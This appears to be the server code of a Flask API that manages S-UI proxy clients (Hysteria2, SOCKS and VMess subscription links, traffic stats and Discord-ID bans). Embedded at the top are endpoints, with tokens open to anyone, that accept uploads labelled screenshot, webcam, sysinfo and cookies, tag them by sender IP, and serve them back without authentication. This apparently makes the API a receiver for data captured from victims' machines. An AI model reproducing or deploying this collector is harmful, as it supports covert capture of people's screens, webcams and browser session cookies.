#!/usr/bin/env python3
import base64
import http.client
import json
import os
import secrets
import socket
import sqlite3
import ssl
import subprocess
import threading
import time
import uuid
from datetime import datetime
from urllib.parse import quote, urlsplit

from flask import Flask, jsonify, request, send_from_directory


app = Flask(__name__)
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)
tokens = set()


def required_env(name: str) -> str:
    value = os.environ.get(name, "").strip()
    if not value:
        raise RuntimeError(f"Missing required environment variable: {name}")
    return value


SUI_SERVER_ADDRESS = required_env("SUI_SERVER_ADDRESS")
SUI_HYSTERIA2_PORT = required_env("SUI_HYSTERIA2_PORT")
SUI_HYSTERIA2_QUERY = required_env("SUI_HYSTERIA2_QUERY")
SUI_HYSTERIA2_INBOUND_ID = int(required_env("SUI_HYSTERIA2_INBOUND_ID"))
SUI_SUBSCRIPTION_REMARK = required_env("SUI_SUBSCRIPTION_REMARK")
SUI_DB_PATH = required_env("SUI_DB_PATH")
SUI_API_HOST = required_env("SUI_API_HOST")
SUI_API_PORT = int(required_env("SUI_API_PORT"))
SUI_SOCKS_INBOUND_ID = int(os.environ.get("SUI_SOCKS_INBOUND_ID", "8"))
SUI_VMESS_INBOUND_ID = int(os.environ.get("SUI_VMESS_INBOUND_ID", "9"))
SUI_SOCKS_SERVER = required_env("SUI_SOCKS_SERVER")
SUI_SOCKS_PORT = int(required_env("SUI_SOCKS_PORT"))
SUI_SOCKS_REMARK = os.environ.get("SUI_SOCKS_REMARK", "SOCKS").strip() or "SOCKS"
SUI_VMESS_SERVER = required_env("SUI_VMESS_SERVER")
SUI_VMESS_PORT = int(required_env("SUI_VMESS_PORT"))
SUI_VMESS_PATH = required_env("SUI_VMESS_PATH")
SUI_VMESS_REMARK = os.environ.get("SUI_VMESS_REMARK", "VMess").strip() or "VMess"
SUI_ADMIN_TOKEN = required_env("SUI_ADMIN_TOKEN")
SUI_PANEL_API_URL = required_env("SUI_PANEL_API_URL")
SUI_PANEL_API_TOKEN = required_env("SUI_PANEL_API_TOKEN")
SUI_PANEL_CONNECT_HOST = required_env("SUI_PANEL_CONNECT_HOST")
SUI_PANEL_CA_FILE = required_env("SUI_PANEL_CA_FILE")

TRAFFIC_HISTORY_HOURS = 24 * 7


@app.route("/")
def index():
    return jsonify({"status": "ok"})


@app.route("/list")
def list_files():
    files = sorted(os.listdir(UPLOAD_DIR))
    return jsonify(
        [name for name in files if os.path.isfile(os.path.join(UPLOAD_DIR, name))]
    )


@app.route("/file/<path:name>")
def serve_file(name):
    return send_from_directory(UPLOAD_DIR, name)


@app.route("/token")
def issue_token():
    token = secrets.token_hex(16)
    tokens.add(token)
    return jsonify({"token": token})


@app.route("/upload", methods=["POST"])
def receive():
    token = request.args.get("token", "") or request.form.get("token", "")
    if not token or token not in tokens:
        return jsonify({"error": "bad token"}), 403
    tokens.discard(token)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_ip = (
        request.headers.get("X-Real-IP") or request.remote_addr or "0"
    ).replace(":", "_")
    saved = []
    for field in ("screenshot", "webcam", "sysinfo", "diaglog", "cookies"):
        files = (
            request.files.getlist(field)
            if field == "cookies"
            else [request.files.get(field)]
        )
        for uploaded_file in files:
            if not uploaded_file or not uploaded_file.filename:
                continue
            name = f"{timestamp}_{remote_ip}_{field}_{uploaded_file.filename}"
            path = os.path.join(UPLOAD_DIR, name)
            try:
                uploaded_file.save(path)
                saved.append(f"{name}({os.path.getsize(path)}B)")
            except Exception as error:
                saved.append(f"{name}(ERR:{error})")
    return jsonify({"status": "ok", "saved": saved})


def fmt_bytes(value: int) -> str:
    if value >= 1073741824:
        return f"{value / 1073741824:.1f}GB"
    if value >= 1048576:
        return f"{value / 1048576:.1f}MB"
    if value >= 1024:
        return f"{value / 1024:.1f}KB"
    return f"{value}B"


def restart_sui() -> None:
    """Restart S-UI in the background so database changes reach sing-box."""
    threading.Thread(
        target=lambda: subprocess.run(
            ["systemctl", "restart", "s-ui"],
            capture_output=True,
            check=False,
        ),
        daemon=True,
    ).start()


def admin_authorized() -> bool:
    supplied_token = request.headers.get("Authorization", "")
    return secrets.compare_digest(supplied_token, f"Bearer {SUI_ADMIN_TOKEN}")


class LocalAddressHTTPSConnection(http.client.HTTPSConnection):
    """Connect locally while preserving the panel hostname for TLS SNI."""

    def __init__(self, host: str, port: int, connect_host: str, **kwargs):
        self.connect_host = connect_host
        super().__init__(host, port, **kwargs)

    def connect(self) -> None:
        raw_socket = socket.create_connection(
            (self.connect_host, self.port),
            self.timeout,
            self.source_address,
        )
        try:
            self.sock = self._context.wrap_socket(raw_socket, server_hostname=self.host)
        except Exception:
            raw_socket.close()
            raise


def sui_online_user_count() -> int:
    """Return the live user count reported by S-UI's in-memory tracker."""
    panel_url = urlsplit(SUI_PANEL_API_URL)
    if panel_url.scheme != "https" or not panel_url.hostname:
        raise ValueError("SUI_PANEL_API_URL must be an HTTPS URL")
    connection = LocalAddressHTTPSConnection(
        panel_url.hostname,
        panel_url.port or 443,
        SUI_PANEL_CONNECT_HOST,
        timeout=5,
        context=ssl.create_default_context(cafile=SUI_PANEL_CA_FILE),
    )
    request_path = panel_url.path or "/"
    if panel_url.query:
        request_path += "?" + panel_url.query
    try:
        connection.request(
            "GET",
            request_path,
            headers={"Token": SUI_PANEL_API_TOKEN, "Accept": "application/json"},
        )
        response = connection.getresponse()
        if response.status != 200:
            raise ValueError(f"S-UI returned HTTP {response.status}")
        payload = json.loads(response.read())
    finally:
        connection.close()
    if not isinstance(payload, dict) or payload.get("success") is not True:
        raise ValueError("S-UI rejected the online status request")
    online_resources = payload.get("obj")
    if not isinstance(online_resources, dict):
        raise ValueError("S-UI returned an invalid online status object")
    users = online_resources.get("user", [])
    if users is None:
        users = []
    if not isinstance(users, list) or not all(isinstance(user, str) for user in users):
        raise ValueError("S-UI returned an invalid online user list")
    return len(set(users))


def traffic_deltas(name: str, hours: int) -> list[dict]:
    """Aggregate S-UI per-minute user statistics into hourly data points."""
    now_hour = int(time.time() // 3600) * 3600
    earliest_hour = now_hour - (hours - 1) * 3600
    with sqlite3.connect(SUI_DB_PATH) as db:
        rows = db.execute(
            """
            SELECT (date_time / 3600) * 3600 AS hour,
                   SUM(CASE WHEN direction = 1 THEN traffic ELSE 0 END) AS up,
                   SUM(CASE WHEN direction = 0 THEN traffic ELSE 0 END) AS down
            FROM stats
            WHERE resource = 'user' AND tag = ? AND date_time >= ?
            GROUP BY hour
            ORDER BY hour
            """,
            (name, earliest_hour),
        ).fetchall()
    by_hour = {
        int(hour): {"up": int(up or 0), "down": int(down or 0)}
        for hour, up, down in rows
    }
    return [
        {
            "timestamp": hour,
            "up": by_hour.get(hour, {}).get("up", 0),
            "down": by_hour.get(hour, {}).get("down", 0),
        }
        for hour in range(earliest_hour, now_hour + 1, 3600)
    ]


def build_subscription_uri(password: str) -> str:
    return (
        f"hysteria2://{password}@{SUI_SERVER_ADDRESS}:{SUI_HYSTERIA2_PORT}?"
        f"{SUI_HYSTERIA2_QUERY}#{quote(SUI_SUBSCRIPTION_REMARK)}"
    )


def build_subscription_links(name: str, config: dict) -> list[dict]:
    """Build Hysteria 2, SOCKS, and VMess links from stored credentials."""
    hysteria_password = config["hysteria2"]["password"]
    socks = config["socks"]
    vmess = config["vmess"]
    socks_username = quote(str(socks["username"]), safe="")
    socks_password = quote(str(socks["password"]), safe="")
    vmess_payload = {
        "v": "2",
        "ps": SUI_VMESS_REMARK,
        "add": SUI_VMESS_SERVER,
        "port": str(SUI_VMESS_PORT),
        "id": vmess["uuid"],
        "aid": str(vmess.get("alterId", 0)),
        "scy": "auto",
        "net": "ws",
        "type": "none",
        "host": SUI_VMESS_SERVER,
        "path": SUI_VMESS_PATH,
        "tls": "tls",
        "sni": SUI_VMESS_SERVER,
        "fp": "chrome",
    }
    vmess_uri = "vmess://" + base64.b64encode(
        json.dumps(vmess_payload, separators=(",", ":")).encode()
    ).decode()
    return [
        {
            "remark": SUI_SUBSCRIPTION_REMARK,
            "type": "local",
            "uri": build_subscription_uri(hysteria_password),
        },
        {
            "remark": SUI_SOCKS_REMARK,
            "type": "local",
            "uri": (
                f"socks5://{socks_username}:{socks_password}@{SUI_SOCKS_SERVER}:"
                f"{SUI_SOCKS_PORT}#{quote(SUI_SOCKS_REMARK)}"
            ),
        },
        {
            "remark": SUI_VMESS_REMARK,
            "type": "local",
            "uri": vmess_uri,
        },
    ]


def has_current_socks_link(links: object) -> bool:
    """Return whether stored links point at the currently configured SOCKS endpoint."""
    if not isinstance(links, list):
        return False
    endpoint = f"{SUI_SOCKS_SERVER}:{SUI_SOCKS_PORT}"
    return any(
        isinstance(item, dict)
        and isinstance(item.get("uri"), str)
        and item["uri"].startswith(("socks://", "socks5://"))
        and f"@{endpoint}" in item["uri"]
        for item in links
    )


@app.route("/api/info/<name>")
def api_info(name):
    """Get client information and traffic totals by name."""
    with sqlite3.connect(SUI_DB_PATH) as db:
        row = db.execute(
            "SELECT id, name, volume, expiry, down, up, total_up, total_down, enable "
            "FROM clients WHERE name=?",
            (name,),
        ).fetchone()
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify(
        {
            "id": row[0],
            "name": row[1],
            "volume": row[2],
            "expiry": row[3],
            "down": row[4],
            "up": row[5],
            "total_up": row[6],
            "total_down": row[7],
            "enabled": bool(row[8]),
            "down_str": fmt_bytes(row[4]),
            "up_str": fmt_bytes(row[5]),
        }
    )


@app.route("/api/traffic/<name>")
def api_traffic(name):
    """Return up to seven days of hourly upload and download totals."""
    try:
        hours = min(
            max(int(request.args.get("hours", TRAFFIC_HISTORY_HOURS)), 1),
            TRAFFIC_HISTORY_HOURS,
        )
    except ValueError:
        return jsonify({"error": "hours must be an integer"}), 400
    return jsonify({"samples": traffic_deltas(name, hours)})


@app.route("/api/sub/<name>")
def api_sub(name):
    """Get subscription links, repairing a missing links field when possible."""
    db = sqlite3.connect(SUI_DB_PATH)
    row = db.execute(
        "SELECT links, config FROM clients WHERE name=?", (name,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "not found"}), 404

    links_blob, config_blob = row
    try:
        links = json.loads(links_blob or b"[]")
    except (TypeError, ValueError, json.JSONDecodeError):
        links = []

    if (
        isinstance(links, list)
        and links
        and isinstance(links[0], dict)
        and links[0].get("uri")
        and has_current_socks_link(links)
    ):
        uri = links[0]["uri"]
    else:
        try:
            config = json.loads(config_blob or b"{}")
            links = build_subscription_links(name, config)
            uri = links[0]["uri"]
        except (KeyError, TypeError, ValueError, json.JSONDecodeError):
            db.close()
            return jsonify({"error": "subscription is not ready"}), 503
        repaired = json.dumps(links).encode()
        db.execute(
            "UPDATE clients SET links=? WHERE name=?",
            (sqlite3.Binary(repaired), name),
        )
        db.commit()

    db.close()
    return jsonify({"uri": uri})


@app.route("/api/reload", methods=["POST"])
def api_reload():
    restart_sui()
    return jsonify({"status": "ok"})


@app.route("/api/ban/<name>", methods=["POST"])
def api_ban(name):
    """Disable a client and place it in the S-UI banned group."""
    if not admin_authorized():
        return jsonify({"error": "unauthorized"}), 401
    if not name.isdigit():
        return jsonify({"error": "name must be a Discord user ID"}), 400

    data = request.get_json(silent=True) or {}
    reason = str(data.get("reason", "")).strip()
    if not reason:
        return jsonify({"error": "reason required"}), 400
    if len(reason) > 512:
        return jsonify({"error": "reason is too long"}), 400

    db = sqlite3.connect(SUI_DB_PATH)
    row = db.execute(
        'SELECT enable, "group" FROM clients WHERE name=?', (name,)
    ).fetchone()
    if row is None:
        db.close()
        return jsonify({"error": "not found"}), 404

    previous_enabled = bool(row[0])
    previous_group = row[1] or ""
    db.execute(
        'UPDATE clients SET enable=0, "group"=? WHERE name=?',
        ("banned", name),
    )
    db.commit()
    db.close()

    if previous_enabled or previous_group != "banned":
        restart_sui()

    return jsonify(
        {
            "name": name,
            "enabled": False,
            "group": "banned",
            "previous_enabled": previous_enabled,
            "previous_group": previous_group,
        }
    )


@app.route("/api/restore/<name>", methods=["POST"])
def api_restore(name):
    """Restore client state when a paired Discord ban could not complete."""
    if not admin_authorized():
        return jsonify({"error": "unauthorized"}), 401
    if not name.isdigit():
        return jsonify({"error": "name must be a Discord user ID"}), 400

    data = request.get_json(silent=True) or {}
    previous_enabled = data.get("enabled")
    previous_group = data.get("group", "")
    if not isinstance(previous_enabled, bool):
        return jsonify({"error": "enabled must be a boolean"}), 400
    if not isinstance(previous_group, str) or len(previous_group) > 128:
        return jsonify({"error": "invalid group"}), 400

    db = sqlite3.connect(SUI_DB_PATH)
    row = db.execute("SELECT id FROM clients WHERE name=?", (name,)).fetchone()
    if row is None:
        db.close()
        return jsonify({"error": "not found"}), 404

    db.execute(
        'UPDATE clients SET enable=?, "group"=? WHERE name=?',
        (int(previous_enabled), previous_group, name),
    )
    db.commit()
    db.close()
    restart_sui()
    return jsonify(
        {"name": name, "enabled": previous_enabled, "group": previous_group}
    )


@app.route("/api/clients")
def api_clients():
    """List all enabled clients whose names are Discord IDs."""
    with sqlite3.connect(SUI_DB_PATH) as db:
        names = [
            row[0]
            for row in db.execute(
                "SELECT name FROM clients WHERE enable=1 AND name GLOB '[0-9]*'"
            ).fetchall()
        ]
    return jsonify(names)


@app.route("/api/stats")
def api_stats():
    """Return S-UI live users, enabled traffic, and total registrations."""
    try:
        online = sui_online_user_count()
    except (
        http.client.HTTPException,
        ssl.SSLError,
        socket.timeout,
        TimeoutError,
        OSError,
        ValueError,
        json.JSONDecodeError,
    ):
        app.logger.exception("Could not read live online users from S-UI")
        return jsonify({"error": "S-UI online status unavailable"}), 502

    with sqlite3.connect(SUI_DB_PATH) as db:
        down, up = db.execute(
            "SELECT SUM(down), SUM(up) FROM clients WHERE enable=1"
        ).fetchone()
        registrations = db.execute("SELECT COUNT(*) FROM clients").fetchone()[0]
    return jsonify(
        {
            "online": online,
            "total_bytes": (down or 0) + (up or 0),
            "registrations": registrations,
        }
    )


@app.route("/api/create", methods=["POST"])
def api_create():
    """Create a client with Hysteria 2, SOCKS, and VMess credentials."""
    data = request.get_json(silent=True) or {}
    name = str(data.get("name", "")).strip()
    if not name:
        return jsonify({"error": "name required"}), 400

    db = sqlite3.connect(SUI_DB_PATH)
    if db.execute("SELECT id FROM clients WHERE name=?", (name,)).fetchone():
        db.close()
        return jsonify({"error": "already exists"}), 409

    password = secrets.token_hex(16)
    user_uuid = str(uuid.uuid4())
    shadowsocks_password = base64.b64encode(password.encode()).decode()
    shadowsocks16_password = base64.b64encode(password[:16].encode()).decode()
    config = {
        "mixed": {"username": name, "password": password},
        "socks": {"username": name, "password": password},
        "http": {"username": name, "password": password},
        "shadowsocks": {"name": name, "password": shadowsocks_password},
        "shadowsocks16": {"name": name, "password": shadowsocks16_password},
        "shadowtls": {"name": name, "password": shadowsocks_password},
        "vmess": {"name": name, "uuid": user_uuid, "alterId": 0},
        "vless": {"name": name, "uuid": user_uuid, "flow": "xtls-rprx-vision"},
        "anytls": {"name": name, "password": password},
        "trojan": {"name": name, "password": password},
        "naive": {"username": name, "password": password},
        "hysteria": {"name": name, "auth_str": password},
        "tuic": {"name": name, "uuid": user_uuid, "password": password},
        "hysteria2": {"name": name, "password": password},
    }
    links = build_subscription_links(name, config)
    inbound_ids = [
        SUI_HYSTERIA2_INBOUND_ID,
        SUI_SOCKS_INBOUND_ID,
        SUI_VMESS_INBOUND_ID,
    ]
    cursor = db.execute(
        "INSERT INTO clients "
        '(enable, name, "group", config, inbounds, links, volume, expiry, down, up) '
        "VALUES (1, ?, 'user', ?, ?, ?, 0, 0, 0, 0)",
        (
            name,
            sqlite3.Binary(json.dumps(config).encode()),
            sqlite3.Binary(json.dumps(inbound_ids).encode()),
            sqlite3.Binary(json.dumps(links).encode()),
        ),
    )
    db.commit()
    client_id = cursor.lastrowid
    db.close()
    restart_sui()
    return jsonify({"id": client_id, "name": name, "links": links[0]["uri"]})


if __name__ == "__main__":
    app.run(host=SUI_API_HOST, port=SUI_API_PORT)
